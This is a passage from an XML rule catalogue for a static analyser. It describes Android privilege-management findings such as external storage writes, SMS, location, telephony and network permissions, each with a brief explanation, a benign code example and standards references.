							  Files written to external storage are readable and writeable by arbitrary programs and users. Programs must never write sensitive information, for instance personally identifiable information, to external storage. When you connect the Android device via USB to a PC or other device it enables USB mass storage mode. Any file written to external storage can be read and modified in this mode. In addition, files in external storage will remain there even after the application that wrote them is uninstalled, further increasing the risk that any sensitive information stored in them will be compromised.<br><br><b>Example 1:</b>The <code>&lt;uses-permission .../%gt;</code> element of AndroidManifest.xml includes the dangerous attribute.<br><br><pre> &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt; </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12]  <em>Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Ruggero Contu, John Girard <em>Put security policies in place for portable storage devices</em> Gartner Research<br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[17]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_android_disable</key>
		<internalKey>Security Features/Privilege Management/Android Disable
		</internalKey>
		<name>Privilege Management: Android Disable</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program requests permission to disable the handset.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  There is no good reason to request or grant a permission that disables the device.<br><br><b>Example 1:</b> A program must not call this permission. Ever.<br><pre> &lt;uses-permission android:name="android.permission.BRICK"/&gt; </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Mark L. Murphy <em>Beginning Android 2</em> Apress<br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_android_location</key>
		<internalKey>Security Features/Privilege Management/Android Location
		</internalKey>
		<name>Privilege Management: Android Location</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program accesses the device's GPS location.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Access to GPS location information can compromise a user's privacy and personal safety. Programs that access GPS location information must be careful to manage it with the utmost caution.<br><br><b>Example:</b> The following code requests to receive updates to the changes of the location of the phone.<br><br><pre>lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0, locationListener);</pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[15]  <em>Securing the Presidential Blackberry</em> PC World<br></p>
																									   <p>[16]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_android_messaging</key>
		<internalKey>Security Features/Privilege Management/Android Messaging
		</internalKey>
		<name>Privilege Management: Android Messaging</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program performs SMS operations.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SMS operations must not be performed without cause or consideration. Malicious software exploits these APIs to steal money and data from unwary users.<br><br><b>Example:</b> In this case, the program sends a text based SMS.<br><br><pre>sms.sendTextMessage(recipient, null, message, PendingIntent.getBroadcast(SmsMessaging.this, 0, new Intent(ACTION_SMS_SENT), 0), null);</pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Mark L. Murphy <em>Beginning Android</em> Apress<br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[13]  <em>First SMS Trojan detected for smartphones running Android</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[17]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_android_network</key>
		<internalKey>Security Features/Privilege Management/Android Network
		</internalKey>
		<name>Privilege Management: Android Network</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program requests permission to make a network connection.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Granting this permission will allow the software to open network sockets. This permission would give the program<br>	control over the device that can negatively impact the user. Because this type of permission introduces potential risk, the system may not automatically grant<br>	it to the requestor.<br><b>Example 1:</b> The <code>&lt;uses-permission .../&gt;</code> element of the AndroidManifest.xml below includes a network permission attribute.<br><br><pre> &lt;uses-permission android:name="android.permission.INTERNET"/&gt; </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Mark L. Murphy <em>Beginning Android 2</em> Apress<br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_android_telephony</key>
		<internalKey>Security Features/Privilege Management/Android Telephony
		</internalKey>
		<name>Privilege Management: Android Telephony</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program performs operations related to making and receiving telephone calls.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Operations related to making and receiving telephone calls must not be performed without cause or consideration. Malicious software exploits these APIs to call premium-pay numbers, thereby stealing money from unwary users.<br><br><b>Example:</b> The code below requests the complete voice mail number.<br><br><pre>number = tm.getCompleteVoiceMailNumber(); </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Mark L. Murphy <em>Beginning Android 2</em> Apress<br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16]  <em>Using Permissions</em> <br></p>
																									   <p>[17]  <em>Who creates malware and why?</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_dangerous_intent_permission
		</key>
		<internalKey>Security Features/Privilege Management/Dangerous Intent
			Permission
		</internalKey>
		<name>Privilege Management: Dangerous Intent Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Some permissions on Intents are there to be able to grant permissions to external programs that do not usually have that permission, such as <code>FLAG_GRANT_READ_URI_PERMISSION</code> and <code>FLAG_GRANT_WRITE_URI_PERMISSION</code>. If a malicious program is able to intercept this intent, it will then gain permission to read from or write to the specified URI. These can often be more susceptible to being intercepted if the intent is implicit rather than explicit.<br><br><b>Example 1:</b> The following code sets the permission flag to enable writing to a URI within the Intent.<br><br><pre><br>  myIntent.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);<br></pre><br>    
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3500 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12]  <em>DRD05-J. Do not grant URI permissions on implicit intents</em> CERT<br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_missing_api_permission
		</key>
		<internalKey>Security Features/Privilege Management/Missing API
			Permission
		</internalKey>
		<name>Privilege Management: Missing API Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program attempts to perform an operation without requesting the required permission.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Certain Android operations require permissions.  Permissions have to be requested by the application at install time by listing them in the <code>AndroidManifest.xml</code> file via <code>&lt;uses-permission/&gt;</code> tags. If the required permissions are not requested, the operations that require these permissions will fail at runtime. In some cases, a <code>java.lang.SecurityException</code> is thrown back to the application. Other times, operations fail silently without an exception.<br><br><b>Example 1:</b> The following code sends a text based SMS.<br><br><pre>sms.sendTextMessage(recipient, null, message, PendingIntent.getBroadcast(SmsMessaging.this, 0, new Intent(ACTION_SMS_SENT), 0), null);</pre><br><br>This API requires the <code>android.permission.SEND_SMS</code> permission. If this permission is not requested by the application in the manifest file, the application will fail to send an SMS.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] A. P. Felt, E. Chin, S. Hanna, D. Song, and D. Wagner <em>Android Permissions Demystified</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[14]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_missing_content_provider_permission
		</key>
		<internalKey>Security Features/Privilege Management/Missing Content
			Provider Permission
		</internalKey>
		<name>Privilege Management: Missing Content Provider Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program attempts to perform an operation without requesting the required permission.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Certain Android operations require permissions.  Permissions have to be requested by the application at install time by listing them in the <code>AndroidManifest.xml</code> file via <code>&lt;uses-permission/&gt;</code> tags. If the required permissions are not requested, the operations that require these permissions will fail at runtime. In some cases, a <code>java.lang.SecurityException</code> is thrown back to the application. Other times, operations fail silently without an exception.<br><br><b>Example 1:</b> The following code reads contacts information stored on the device.<br><br><pre>Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);</pre><br><br>Reading data from this content provider requires the <code>android.permission.READ_CONTACTS</code> permission. If this permission is not requested by the application in the manifest file, the application will fail to read contacts information.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] A. P. Felt, E. Chin, S. Hanna, D. Song, and D. Wagner <em>Android Permissions Demystified</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[14]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_missing_intent_permission
		</key>
		<internalKey>Security Features/Privilege Management/Missing Intent
			Permission
		</internalKey>
		<name>Privilege Management: Missing Intent Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program attempts to perform an operation without requesting the required permission.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Certain Android operations require permissions.  Permissions have to be requested by the application at install time by listing them in the <code>AndroidManifest.xml</code> file via <code>&lt;uses-permission/&gt;</code> tags. If the required permissions are not requested, the operations that require these permissions will fail at runtime. In some cases, a <code>java.lang.SecurityException</code> is thrown back to the application. Other times, operations fail silently without an exception.<br><br><b>Example 1:</b> The following code sends an intent with the <code>android.provider.Telephony.SMS_RECEIVED</code> action.<br><br><pre><br>    Intent i = new Intent("android.provider.Telephony.SMS_RECEIVED");<br>    context.sendBroadcast(i);<br></pre><br><br>Sending this intent requires the <code>android.permission.BROADCAST_SMS</code> permission. If this permission is not requested by the application in the manifest file, the application will fail to send the intent.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] A. P. Felt, E. Chin, S. Hanna, D. Song, and D. Wagner <em>Android Permissions Demystified</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[14]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_privilege_management_overly_broad_access_specifier
		</key>
		<internalKey>Security Features/Privilege Management/Overly Broad
			Access Specifier
		</internalKey>
		<name>Privilege Management: Overly Broad Access Specifier</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Privileged code in <code>public</code> methods can be called from anywhere in the JVM.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Secure coding principles advocate making access specifiers as restrictive as possible. A method with a <code>public</code> access specifier means that any external code is allowed to call it. Public methods that perform privileged actions can be dangerous when code is shared in libraries or in environments where code can dynamically enter the system (e.g. Code Injection, Dangerous File Inclusion, File Upload, etc).<br><br><br><br><b>Example 1:</b> In the following code, <code>doPrivilegedOpenFile()</code> is declared <code>public</code> and performs a privileged operation.<br><pre><br>public static void doPrivilegedOpenFile(final String filePath) {<br>final BadFileNamePrivilegedAction pa = new BadFileNamePrivilegedAction(filePath);<br><br>FileInputStream fis = null;<br>...<br>fis = (FileInputStream)AccessController.doPrivileged(pa);<br>...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-6 Least Privilege (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3500 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3500 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3500 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3500 CAT II</em> <br></p>
